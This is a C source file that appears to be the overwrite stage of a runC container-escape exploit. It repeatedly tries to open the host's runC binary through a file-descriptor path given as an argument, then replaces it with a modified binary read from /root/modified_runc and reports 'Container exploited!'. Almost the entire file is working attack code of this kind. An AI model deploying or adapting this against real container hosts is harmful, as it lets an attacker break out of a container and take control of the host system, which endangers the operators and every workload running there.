#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define FALSE 0
#define TRUE  1

typedef struct Buffer
{
	int len;		// buffer length
	void * buff;		// buffer data
} Buffer;

const char * MODIFIED_RUNC_PATH = "/root/modified_runc";
const unsigned int PATH_MAX_LEN = 30;
const int OPEN_ERR = -1;
const int RET_ERR = 1;
const int RET_OK = 0;
const long WRITE_TIMEOUT = 99999999999999999;

Buffer read_modified_runc(char * modified_runc_path);

/*
* overwrite <path to the runC binary>
* Overwrites the runC binary.
*/
int main(int argc, char *argv[])
{
	int  runc_fd_write, wc;
	char * runc_fd_path;
	char * modified_runc_path;                    
	Buffer modified_runc;


	printf("Running \n");
	fflush(stdout);

	runc_fd_path = argv[1];
	modified_runc_path = MODIFIED_RUNC_PATH;
	modified_runc = read_modified_runc(modified_runc_path);

	if (modified_runc.buff == NULL)
	{
		return RET_ERR;
	}	

	/* Write at runc_fd_path      */
	int opened = FALSE;
	for (long count = 0; (!opened && count < WRITE_TIMEOUT); count++)
	{
		runc_fd_write = open(runc_fd_path, O_WRONLY | O_TRUNC);
		if (runc_fd_write != OPEN_ERR)
		{
			printf("Opened %s for writing\n", runc_fd_path);
			wc = write(runc_fd_write, modified_runc.buff, modified_runc.len);
			if (wc !=  modified_runc.len)
			{
				printf("[!] Error writing to process's runC's fd", runc_fd_path);
				fflush(stdout);
				close(runc_fd_write);
				free(modified_runc.buff);
				return RET_ERR;
			}
			printf("Overwrote runC\n");
			opened = TRUE;
		}
	}

	close(runc_fd_write);
	free(modified_runc.buff);
	if (opened == FALSE)
	{
		printf("[!] TIMEOUT...\n");
		fflush(stdout);
		return RET_ERR;
	}
	else
	{
		printf("Container exploited! Shuting down ...\n");
		fflush(stdout);
	}
	return RET_OK;
}

/*
* Reads from the modified runc file and return a buffer with the modified content.
*/
Buffer read_modified_runc(char * modified_runc_path)
{
	Buffer modified_runc = {0, NULL};
	FILE *fp_modified_runc;
	int file_size, rc;
	void * modified_runc_content;
	char ch;

	fp_modified_runc = fopen(modified_runc_path, "r"); // read mode
	if (fp_modified_runc == NULL)
	{
	  printf("[!] Error opening runc file\n");
	  return modified_runc;
	}

	// Get file size and prepare buff
	fseek(fp_modified_runc, 0L, SEEK_END);
	file_size = ftell(fp_modified_runc);
	modified_runc_content = malloc(file_size);
	rewind(fp_modified_runc);

	rc = fread(modified_runc_content, 1, file_size, fp_modified_runc);
	if (rc != file_size)
	{
		printf("[!] Error reading from modified runc file\n");
		free(modified_runc_content);
		return modified_runc;
	}

	fclose(fp_modified_runc);
	modified_runc.len = rc;
	modified_runc.buff = modified_runc_content;
	return modified_runc;

}
